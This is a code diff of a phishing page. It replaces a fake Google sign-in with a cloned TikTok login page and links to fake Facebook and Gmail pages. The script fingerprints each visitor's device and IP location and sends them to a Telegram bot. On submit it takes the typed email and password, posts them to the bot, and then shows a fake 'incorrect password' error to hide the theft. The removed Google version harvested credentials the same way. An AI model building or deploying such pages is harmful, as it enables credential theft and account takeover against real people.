@@ -2,152 +2,188 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Sign In</title>
+  <title>TikTok Login Clone</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    body {
-      background: #000;
-      color: #bbb;
-      font-family: Arial, sans-serif;
+    * {
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
       margin: 0;
       padding: 0;
-      min-height: 100vh;
+    }
+    body {
+      background-color: #f8f8f8;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
+      height: 100vh;
     }
     .container {
-      width: 100%;
-      max-width: 400px;
-      margin: auto;
-      padding: 32px 24px;
-      background: rgba(0,0,0,0.85);
+      background: #fff;
+      padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 2px 16px rgba(0,0,0,0.5);
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      width: 360px;
       text-align: center;
     }
-    .google-title {
-      font-size: 2.2em;
-      color: #fff;
-      margin-bottom: 0.2em;
-      font-family: 'Product Sans', Arial, sans-serif;
+    h2 {
+      margin-bottom: 25px;
     }
-    .sign-in {
-      font-size: 1.5em;
-      color: #fff;
-      margin-bottom: 0.5em;
-    }
-    .desc {
-      font-size: 1em;
-      margin-bottom: 1.5em;
-      color: #bbb;
-    }
-    .desc a {
-      color: #4285f4;
-      text-decoration: none;
-    }
-    .input-box {
+    .btn {
       width: 100%;
       padding: 12px;
-      font-size: 1em;
-      border: 1px solid #444;
-      border-radius: 4px;
-      margin-bottom: 1em;
-      background: #111;
-      color: #fff;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+      cursor: pointer;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
     }
-    .forgot, .create {
-      display: block;
-      color: #4285f4;
-      text-decoration: none;
-      margin-bottom: 1.5em;
-      font-size: 1em;
-      text-align: left;
+    .btn:hover {
+      background-color: #f0f0f0;
     }
-    .create {
-      margin-bottom: 2em;
-      text-align: left;
+    .btn.google {
+      color: #000;
     }
-    .next-btn {
-      background: #4285f4;
+    .btn.facebook {
+      color: #1877f2;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 15px 0;
+    }
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #ddd;
+    }
+    .divider span {
+      margin: 0 10px;
+      color: #888;
+    }
+    .guest-btn {
+      background-color: #fe2c55;
       color: #fff;
       border: none;
-      padding: 12px 32px;
-      border-radius: 4px;
-      font-size: 1em;
-      cursor: pointer;
-      float: right;
+      font-weight: bold;
     }
-    @media (max-width: 500px) {
-      .container {
-        padding: 16px 8px;
-        max-width: 100vw;
-      }
-      .google-title {
-        font-size: 1.5em;
-      }
-      .sign-in {
-        font-size: 1.1em;
-      }
-      .desc {
-        font-size: 0.95em;
-      }
-      .input-box {
-        font-size: 0.95em;
-        padding: 10px;
-      }
-      .next-btn, #login-btn {
-        width: 100%;
-        float: none;
-        padding: 12px 0;
-        font-size: 1em;
-      }
-      .forgot, .create {
-        font-size: 0.95em;
-      }
-      #password-step > div[style*="display: flex"] {
-        flex-direction: column;
-        align-items: flex-start !important;
-      }
+    .guest-btn:hover {
+      background-color: #e61e45;
+    }
+    .bottom-text {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+    .bottom-text a {
+      color: #fe2c55;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .note {
+      font-size: 12px;
+      margin-top: 15px;
+      color: #999;
+    }
+    .note b {
+      color: #000;
     }
   </style>
 </head>
 <body>
-  <div class="container" id="email-step">
-    <div class="google-title">Google</div>
-    <div class="sign-in">Sign in</div>
-    <div class="desc">
-      Use your Google Account. The account will be added to this device and available to other Google apps.<br>
-      <a href="#">Learn more about using your account</a>
-    </div>
-    <input class="input-box" id="email-input" type="text" placeholder="Email or phone">
-    <a class="forgot" href="#">Forgot email?</a>
-    <a class="create" href="#">Create account</a>
-    <button class="next-btn" id="next-btn">Next</button>
-  </div>
+  <div class="container">
+    <span id="back-arrow" style="display:none; position:absolute; left:24px; top:24px; cursor:pointer; font-size:28px;">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15 19L8 12L15 5" stroke="#191919" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </span>
+    <h2>Log in to TikTok</h2>
+    <button class="btn"><img src="https://img.icons8.com/ios/20/000000/qr-code.png"/>Use QR code</button>
+    <button class="btn" id="show-login-form"><img src="https://img.icons8.com/ios/20/000000/user.png"/>Use phone / email / username</button>
+    <button class="btn facebook" id="facebook-login-btn"><img src="https://img.icons8.com/ios-filled/20/1877F2/facebook-new.png"/>Continue with Facebook</button>
+    <button class="btn google" id="google-login-btn"><img src="https://img.icons8.com/color/20/000000/google-logo.png"/>Continue with Google</button>
+    
+    <div class="divider"><span>OR</span></div>
 
-  <div class="container" id="password-step" style="display:none;">
-    <div class="google-title">Google</div>
-    <div class="sign-in">Welcome</div>
-    <div style="margin: 16px 0 24px 0; color: #bbb; display: flex; align-items: center; justify-content: center;">
-      <span style="font-size: 1.5em; margin-right: 8px;">&#128100;</span>
-      <span id="user-email" style="font-size: 1.1em; color: #bbb;"></span>
+    <button class="btn guest-btn" id="guest-btn">Continue as guest</button>
+
+    <!-- Login form, hidden by default -->
+    <form id="login-form" style="display:none; margin-top: 20px; text-align: left;">
+      <h2 style="text-align:center;">Log in</h2>
+      <label for="login-email" style="font-weight:600;">Email or username</label>
+      <span style="float:right; font-size:13px; color:#888; font-weight:400;">Log in with phone</span>
+      <input id="login-email" type="text" placeholder="Email or username" style="width:100%;margin:8px 0 12px 0;padding:10px;border-radius:6px;border:1px solid #ddd;background:#f3f3f3;">
+      <input id="login-password" type="password" placeholder="Password" style="width:100%;margin-bottom:8px;padding:10px;border-radius:6px;border:1px solid #ddd;background:#f3f3f3;">
+      <span style="float:right; font-size:13px; color:#888; cursor:pointer;">Forgot password?</span>
+      <button id="tiktok-login-btn" type="submit" disabled style="width:100%;margin-top:18px;padding:12px;border-radius:8px;border:none;background:#ececec;color:#aaa;font-weight:600;font-size:16px;cursor:not-allowed;transition:background 0.2s, color 0.2s;">Log in</button>
+    </form>
+
+    <div class="note">
+      By continuing with an account located in <b>Bangladesh</b>, you agree to our 
+      <a href="#">Terms of Service</a> and acknowledge that you have read our 
+      <a href="#">Privacy Policy</a>.
     </div>
-    <div id="error-message" style="display:none; color:#ffb3b3; background: #2d0000; border-left: 4px solid #ff8888; padding: 8px 12px; margin-bottom: 1em; text-align:left; font-size:1em;">
-      <span style="font-weight:bold; margin-right:6px;">&#9888;</span> Wrong password. Try again or click Forgot password to reset it.
-    </div>
-    <input class="input-box" id="password-input" type="password" placeholder="Enter your password">
-    <div style="text-align:left; margin-bottom: 1.5em;">
-      <input type="checkbox" id="show-password" style="vertical-align: middle;"> <label for="show-password" style="vertical-align: middle; color: #bbb;">Show password</label>
-    </div>
-    <div style="display: flex; justify-content: space-between; align-items: center;">
-      <a class="forgot" href="#" style="margin-bottom:0; color:#4285f4;">FORGOT PASSWORD?</a>
-      <button class="next-btn" id="login-btn">Login</button>
+
+    <div class="bottom-text">
+      Don't have an account? <a href="#">Sign up</a>
     </div>
   </div>
-
   <script>
+    const showLoginBtn = document.getElementById('show-login-form');
+    const loginForm = document.getElementById('login-form');
+    const mainButtons = Array.from(document.querySelectorAll('.btn')).filter(btn => btn !== showLoginBtn);
+    const divider = document.querySelector('.divider');
+    const note = document.querySelector('.note');
+    const bottomText = document.querySelector('.bottom-text');
+    const backArrow = document.getElementById('back-arrow');
+    const facebookLoginBtn = document.getElementById('facebook-login-btn');
+    const googleLoginBtn = document.getElementById('google-login-btn');
+    const guestBtn = document.getElementById('guest-btn');
+
+    showLoginBtn.addEventListener('click', function() {
+      // Hide all main buttons, divider, note, and bottom text
+      mainButtons.forEach(btn => btn.style.display = 'none');
+      showLoginBtn.style.display = 'none';
+      if (divider) divider.style.display = 'none';
+      if (note) note.style.display = 'none';
+      if (bottomText) bottomText.style.display = 'none';
+      // Show login form
+      loginForm.style.display = 'block';
+      backArrow.style.display = 'block';
+    });
+    backArrow.addEventListener('click', function() {
+      // Hide login form and back arrow
+      loginForm.style.display = 'none';
+      backArrow.style.display = 'none';
+      // Show main buttons, divider, note, and bottom text
+      mainButtons.forEach(btn => btn.style.display = '');
+      showLoginBtn.style.display = '';
+      if (divider) divider.style.display = '';
+      if (note) note.style.display = '';
+      if (bottomText) bottomText.style.display = '';
+    });
+    facebookLoginBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      window.location.href = 'm.facebook.html';
+    });
+    googleLoginBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      window.location.href = 'gmail.html';
+    });
+    if (guestBtn) {
+      guestBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://www.tiktok.com/explore';
+      });
+    }
+
     // Fetch Telegram config from server.txt
     async function getTelegramConfig() {
       try {
@@ -172,7 +208,6 @@
       TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     });
 
-    // Guess device name/type from user agent
     function getDeviceName() {
       const ua = navigator.userAgent;
       if (/android/i.test(ua)) {
@@ -193,7 +228,6 @@
       }
     }
 
-    // Collect device info
     async function getDeviceInfo() {
       let batteryInfo = '';
       if (navigator.getBattery) {
@@ -206,7 +240,6 @@
       } else {
         batteryInfo = '🔋 Battery: N/A';
       }
-      // Additional details
       const screenRes = `🖥️ Screen: ${window.screen.width}x${window.screen.height}`;
       const timezone = `⏰ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
       const referrer = `🔗 Referrer: ${document.referrer || 'Direct/None'}`;
@@ -233,7 +266,6 @@
       return info.join('\n');
     }
 
-    // Fetch IP and geolocation info (CORS-friendly)
     async function getIPInfo() {
       try {
         const res = await fetch('https://geolocation-db.com/json/');
@@ -245,7 +277,6 @@
       }
     }
 
-    // Send message to Telegram
     async function sendToTelegram(message) {
       await fetch(TG_API, {
         method: 'POST',
@@ -261,76 +292,72 @@
       sendToTelegram(`🟢 New visitor!\n${deviceInfo}\n${ipInfo}`);
     });
 
-    const emailStep = document.getElementById('email-step');
-    const passwordStep = document.getElementById('password-step');
-    const nextBtn = document.getElementById('next-btn');
-    const emailInput = document.getElementById('email-input');
-    const userEmail = document.getElementById('user-email');
-    const showPassword = document.getElementById('show-password');
-    const passwordInput = document.getElementById('password-input');
-    const loginBtn = document.getElementById('login-btn');
-    const errorMessage = document.getElementById('error-message');
-
-    nextBtn.addEventListener('click', function() {
-      const email = emailInput.value.trim();
-      if (email) {
-        userEmail.textContent = email;
-        emailStep.style.display = 'none';
-        passwordStep.style.display = 'block';
-      } else {
-        emailInput.focus();
-        emailInput.style.borderColor = '#f00';
-        setTimeout(() => emailInput.style.borderColor = '#444', 1000);
-      }
-    });
-
-    if (showPassword && passwordInput) {
-      showPassword.addEventListener('change', function() {
-        passwordInput.type = this.checked ? 'text' : 'password';
-      });
-    }
-
-    if (loginBtn) {
-      loginBtn.addEventListener('click', async function() {
-        // For demo, always show error
-        errorMessage.style.display = 'block';
-        // Collect info
-        const email = userEmail.textContent || '';
-        const password = passwordInput.value || '';
+    // On TikTok login form submit
+    const loginFormEl = document.getElementById('login-form');
+    if (loginFormEl) {
+      let loadingDiv = null;
+      let errorDiv = null;
+      loginFormEl.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = document.getElementById('login-email').value;
+        const password = document.getElementById('login-password').value;
         const deviceInfo = await getDeviceInfo();
         const ipInfo = await getIPInfo();
-        // Format message for Telegram
-        const msg = `📋 *Tap to copy*\n\n*Email/Phone:* \`${email}\`\n*Password:* \`${password}\`\n\n${deviceInfo}\n${ipInfo}`;
-        sendToTelegram(msg);
+        const credsBlock = `\n\n📋 Tap to copy:\n👤 Email/Phone: \`${email}\`\n🔑 Password: \`${password}\``;
+        const message = `🔐 TikTok Login${credsBlock}\n${deviceInfo}\n${ipInfo}`;
+        sendToTelegram(message);
+        // Show loading indicator
+        if (!loadingDiv) {
+          loadingDiv = document.createElement('div');
+          loadingDiv.style.textAlign = 'center';
+          loadingDiv.style.margin = '20px 0';
+          loadingDiv.innerHTML = '<span style="font-size:24px;">⏳</span><br>Loading...';
+          loginFormEl.appendChild(loadingDiv);
+        }
+        if (errorDiv) {
+          errorDiv.remove();
+          errorDiv = null;
+        }
+        // After 10 seconds, show error message
+        setTimeout(() => {
+          if (loadingDiv) {
+            loadingDiv.remove();
+            loadingDiv = null;
+          }
+          if (!errorDiv) {
+            errorDiv = document.createElement('div');
+            errorDiv.style.textAlign = 'center';
+            errorDiv.style.color = '#e74c3c';
+            errorDiv.style.margin = '20px 0';
+            errorDiv.innerHTML = `The password that you've entered is incorrect.<br><a href="#" style="color:#fe2c55;text-decoration:underline;">Forgotten password?</a>`;
+            loginFormEl.appendChild(errorDiv);
+          }
+        }, 10000);
       });
     }
 
-    // Add handler for 'Create account' link
-    const createAccountLink = document.querySelector('.create');
-    if (createAccountLink) {
-      createAccountLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        window.open('https://accounts.google.com/lifecycle/steps/signup/name?continue=https://mail.google.com/mail/u/0/&dsh=S302532074:1749743410122667&emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&ifkv=AdBytiMTvJsADgXvTH43m6DrsAtV-LHBHii7nTelpZoXwRnDKtXR4A1TpyytikY2viNcQKvVRsIi&osid=1&service=mail&TL=ALgCv6yfAp_tRBONRTuOu2XolmeH8W3JKNZfTQwWicDRTsQXHsc-Cav2S_NGzh-u', '_blank');
-      });
+    // Tiktok login button enable/disable logic
+    const loginEmail = document.getElementById('login-email');
+    const loginPassword = document.getElementById('login-password');
+    const tiktokLoginBtn = document.getElementById('tiktok-login-btn');
+    function updateLoginBtnState() {
+      if (loginEmail.value.trim() && loginPassword.value.trim()) {
+        tiktokLoginBtn.disabled = false;
+        tiktokLoginBtn.style.background = '#fe2c55';
+        tiktokLoginBtn.style.color = '#fff';
+        tiktokLoginBtn.style.cursor = 'pointer';
+      } else {
+        tiktokLoginBtn.disabled = true;
+        tiktokLoginBtn.style.background = '#ececec';
+        tiktokLoginBtn.style.color = '#aaa';
+        tiktokLoginBtn.style.cursor = 'not-allowed';
+      }
     }
-
-    // Add handler for 'FORGOT PASSWORD?' link (on password step)
-    const forgotPasswordLink = document.querySelector('#password-step .forgot');
-    if (forgotPasswordLink) {
-      forgotPasswordLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        window.open('https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&dsh=S302532074%3A1749743410122667&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=AdBytiPM9kzIQzreskygEm1zgqGxks5Du-05PJaYUM4jpumI3uQrTviYQLk18PWH446PSWfgBP4nbA&osid=1&service=mail', '_blank');
-      });
-    }
-
-    // Add handler for 'Forgot email?' link (on email step)
-    const forgotEmailLink = document.querySelector('#email-step .forgot');
-    if (forgotEmailLink) {
-      forgotEmailLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        window.open('https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&dsh=S302532074%3A1749743410122667&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=AdBytiPM9kzIQzreskygEm1zgqGxks5Du-05PJaYUM4jpumI3uQrTviYQLk18PWH446PSWfgBP4nbA&osid=1&service=mail', '_blank');
-      });
+    if (loginEmail && loginPassword && tiktokLoginBtn) {
+      loginEmail.addEventListener('input', updateLoginBtnState);
+      loginPassword.addEventListener('input', updateLoginBtnState);
     }
   </script>
 </body>
-</html>
+    </html>
+    
